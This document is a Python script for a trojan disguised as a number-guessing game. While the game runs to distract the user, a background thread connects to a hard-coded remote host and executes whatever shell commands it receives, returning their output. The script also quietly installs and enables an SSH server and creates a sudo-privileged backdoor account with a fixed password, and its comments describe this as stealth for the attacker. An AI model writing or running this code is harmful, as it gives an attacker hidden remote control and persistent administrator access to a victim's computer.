import socket
import os
import subprocess
import sys
import platform
import time
import threading

SERVER_HOST = "192.168.18.128"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, can be increased
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"

# create the socket object and connect to the server
s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

# get the current directory
cwd = os.getcwd()
s.send(cwd.encode())

# enable the attacker to ssh into the computer later on, while not providing
# terminal output of the process, to be stealthy
os.system("sudo apt-get install openssh-server > /dev/null 2>&1")
os.system("sudo systemctl enable ssh > /dev/null 2>&1")

# add another admin user
username = 'baduser'
password = 'securePassword'
os.system(f'(echo "{password}"; echo "{password}") | sudo adduser {username} > /dev/null 2>&1')
os.system(f'usermod -aG sudo {username}') # giving the user admin permissions

# send the OS type
osType = (platform.system())
osRelease = platform.release()
s.send((osType + ' ' +  osRelease).encode())

def receiveCommands():
    while True:
        # receive the command from the server
        command = s.recv(BUFFER_SIZE).decode()
        splitted_command = command.split()
        if command.lower() == "exit":
            # if the command is exit, just break out of the loop
            break
        if splitted_command[0].lower() == "cd":
            # cd command, change directory
            try: 
                os.chdir(' '.join(splitted_command[1:]))
            except FileNotFoundError as e:
                # if there is an error, set as the output
                output = str(e)
            else:
                # if operation is successful, empty message
                output = ""
        else:
            # execute the command and retrieve the results
            output = subprocess.getoutput(command)
        # get the current working directory as output
        cwd = os.getcwd()
        # send the results back to the server
        message = f"{output}{SEPARATOR}{cwd}"
        s.send(message.encode())
    # close client connection
    s.close()

def game():
    done = False
    while not done:
        # Confuse unsuspecting user
        print("Compiling quantum micro-algorithms...")
        time.sleep(3)
        guess = int(input("What number am I thinking of between 1 and 5? "))
        time.sleep(2)
        print("Analysing virtual metametadata...")
        time.sleep(2)
        if guess == 0: # Confuse them even more
            print("Correct! Your powers of deduction are impressive.")
            done = True
        else:
            print("Unlucky, try again")

# Initialise both functions
t1 = threading.Thread(target=receiveCommands, args=())
t2 = threading.Thread(target=game, args=())

# Start both functions 'simultaneously'
t1.start()
t2.start()
